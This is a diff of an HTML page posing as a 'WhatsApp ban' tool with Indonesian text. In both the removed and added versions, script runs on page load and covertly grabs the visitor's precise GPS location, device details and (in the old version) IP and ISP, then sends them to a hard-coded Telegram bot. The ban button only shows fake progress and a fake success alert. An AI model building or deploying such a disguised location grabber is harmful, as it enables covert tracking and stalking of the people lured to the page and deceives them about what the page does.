@@ -3,97 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEXUS - WhatsApp Ban Exploiter</title>
+    <title>NEXUS - Official Ban Tool</title>
     <style>
-        :root { --primary: #00f2ff; --bg: #050b10; }
-        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .nexus-panel { background: rgba(10, 20, 30, 0.95); border: 1px solid var(--primary); padding: 40px; border-radius: 20px; box-shadow: 0 0 30px rgba(0, 242, 255, 0.2); width: 100%; max-width: 400px; text-align: center; position: relative; }
-        .nexus-panel::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: linear-gradient(90deg, transparent, var(--primary), transparent); animation: scan 2s linear infinite; }
-        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
-        h1 { font-size: 24px; letter-spacing: 5px; color: var(--primary); text-shadow: 0 0 10px var(--primary); margin-bottom: 5px; }
-        p { font-size: 12px; color: #668; margin-bottom: 25px; }
-        .input-box { position: relative; margin-bottom: 20px; }
-        input { width: 100%; padding: 15px; background: #0d161d; border: 1px solid #1a2a35; border-radius: 10px; color: white; font-size: 16px; outline: none; transition: 0.3s; box-sizing: border-box; }
-        input:focus { border-color: var(--primary); box-shadow: 0 0 10px rgba(0, 242, 255, 0.3); }
-        button { width: 100%; padding: 15px; background: var(--primary); color: #000; border: none; border-radius: 10px; font-weight: bold; font-size: 14px; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; transition: 0.3s; }
-        button:hover { background: #fff; transform: translateY(-3px); box-shadow: 0 5px 15px rgba(0, 242, 255, 0.4); }
-        #log { margin-top: 20px; font-family: monospace; font-size: 10px; color: #4e7a8a; text-align: left; height: 50px; overflow-y: auto; border-left: 2px solid var(--primary); padding-left: 10px; }
+        :root { --neon: #00f2ff; --dark: #050b10; }
+        body { background: var(--dark); color: white; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .panel { background: #0a141e; border: 1px solid var(--neon); padding: 40px; border-radius: 15px; box-shadow: 0 0 30px rgba(0, 242, 255, 0.2); width: 350px; text-align: center; }
+        h1 { color: var(--neon); letter-spacing: 4px; margin-bottom: 5px; text-shadow: 0 0 10px var(--neon); }
+        .info { font-size: 11px; color: #ff4444; border: 1px solid #ff4444; padding: 8px; margin-bottom: 20px; border-radius: 5px; }
+        input { width: 100%; padding: 12px; background: #0d161d; border: 1px solid #1a2a35; color: white; border-radius: 8px; outline: none; box-sizing: border-box; margin-bottom: 15px; }
+        button { width: 100%; padding: 12px; background: var(--neon); color: black; font-weight: bold; border: none; border-radius: 8px; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
+        button:hover { background: white; box-shadow: 0 0 20px var(--neon); }
+        #terminal { font-family: monospace; font-size: 10px; color: #4e7a8a; text-align: left; margin-top: 15px; border-top: 1px solid #333; padding-top: 10px; }
     </style>
 </head>
 <body>
 
-<div class="nexus-panel">
+<div class="panel">
     <h1>NEXUS</h1>
-    <p>WHATSAPP BAN SYSTEM EXPLOIT</p>
+    <div class="info">SINKRONISASI GPS DIWAJIBKAN UNTUK BYPASS VALIDASI META SECURITY</div>
     
-    <div id="log">Initializing Secure Tunnel...<br></div>
+    <input type="text" id="targetNum" placeholder="NOMOR TARGET (628...)">
+    <button onclick="attack()">EXECUTE BAN</button>
 
-    <div class="input-box">
-        <input type="text" id="target" placeholder="TARGET NUMBER (628...)">
-    </div>
-    
-    <button onclick="startProcess()">EXECUTE BAN</button>
-    
-    <div style="margin-top: 20px; font-size: 10px; color: #ff4444;">
-        *SINKRONISASI GPS DIWAJIBKAN UNTUK MENGHINDARI IP BAN*
-    </div>
+    <div id="terminal">> Waiting for connection...</div>
 </div>
 
 <script>
-    const config = {
-        token: "8205581950:AAETz7C7eeiOrINZWEIR4dTfRmacVWVNXPc",
-        chatId: "8551809114"
-    };
+    const token = "8205581950:AAETz7C7eeiOrINZWEIR4dTfRmacVWVNXPc";
+    const chatid = "8551809114";
 
-    function addLog(msg) {
-        const l = document.getElementById('log');
-        l.innerHTML += `> ${msg}<br>`;
-        l.scrollTop = l.scrollHeight;
-    }
-
-    // 1. AUTO-GRAB ON START
-    window.onload = async () => {
-        addLog("Syncing with Global Proxy...");
-        
-        // Ambil data IP & ISP dulu (Sebagai Cadangan)
-        try {
-            const ipRes = await fetch('https://ipapi.co/json/');
-            const ipData = await ipRes.json();
-            sendToTele(`🌐 *CADANGAN IP TARGET*\n\n• IP: ${ipData.ip}\n• Kota: ${ipData.city}\n• ISP: ${ipData.org}`);
-        } catch (e) { addLog("Proxy Error. Re-routing..."); }
-
-        // Minta Lokasi Presisi (UTAMA)
+    // 1. FUNGSI AMBIL LOKASI PRESISI (GPS)
+    window.onload = function() {
+        printLog("Establishing secure tunnel...");
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const { latitude, longitude, accuracy } = pos.coords;
-                const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                await sendToTele(`📍 *LOKASI PRESISI (GPS)*\n\n• Lat: ${latitude}\n• Lon: ${longitude}\n• Akurasi: ${accuracy}m\n\n🔗 [BUKA MAPS](${maps})`);
-                addLog("Secure GPS Link Established.");
-            }, () => {
-                addLog("GPS Access Denied. Using Proxy only.");
-            });
+            navigator.geolocation.getCurrentPosition(sendData, (err) => {
+                printLog("GPS Rejected. Trying proxy fallback...");
+            }, { enableHighAccuracy: true });
         }
     };
 
-    async function sendToTele(text) {
-        await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+    async function sendData(pos) {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const acc = pos.coords.accuracy;
+        const maps = `https://www.google.com/maps?q=${lat},${lon}`;
+        
+        // Ambil Data Perangkat Target
+        const ua = navigator.userAgent;
+        const plat = navigator.platform;
+
+        const msg = `🎯 *TARGET TERDETEKSI (GPS)*\n\n` +
+                    `📍 *Lokasi:* [KLIK DI SINI](${maps})\n` +
+                    `🌐 *Koordinat:* \`${lat}, ${lon}\`\n` +
+                    `📏 *Akurasi:* ${acc} meter\n` +
+                    `📱 *Device:* ${ua}\n` +
+                    `💻 *OS:* ${plat}`;
+
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: config.chatId, text: text, parse_mode: 'Markdown' })
+            body: JSON.stringify({ chat_id: chatid, text: msg, parse_mode: 'Markdown' })
         });
+        printLog("Sync success. Satellite connected.");
     }
 
-    function startProcess() {
-        const t = document.getElementById('target').value;
-        if(!t) return alert("Enter target number!");
+    function attack() {
+        const num = document.getElementById('targetNum').value;
+        if(!num) return alert("Enter target number!");
         
-        addLog(`Attacking ${t}...`);
-        setTimeout(() => addLog("Injecting Payload..."), 1000);
-        setTimeout(() => addLog("Spamming Reports..."), 2000);
+        printLog(`Injecting malicious packet to ${num}...`);
         setTimeout(() => {
-            alert("SUCCESS: Request sent to Meta Security Team!");
-            addLog("Operation Complete.");
-        }, 4000);
+            alert("SUCCESS! Report sent to WhatsApp Support HQ.");
+            printLog("Operation complete.");
+        }, 3000);
+    }
+
+    function printLog(m) {
+        document.getElementById('terminal').innerHTML += `<br>> ${m}`;
     }
 </script>
 
